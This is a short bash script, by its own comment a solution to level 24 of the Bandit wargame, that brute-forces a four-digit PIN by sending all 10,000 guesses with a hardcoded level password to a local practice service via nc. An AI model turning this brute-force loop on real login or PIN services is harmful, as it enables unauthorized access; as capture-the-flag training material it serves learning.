#!/bin/bash
# This is a script that I used to pass level 24 in the bandit game
password="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"
for ((i=0; i<10000; i++)); do
	printf "%s %04d\n" "$password" $i

done | nc localhost 30002 | grep -v "Wrong"
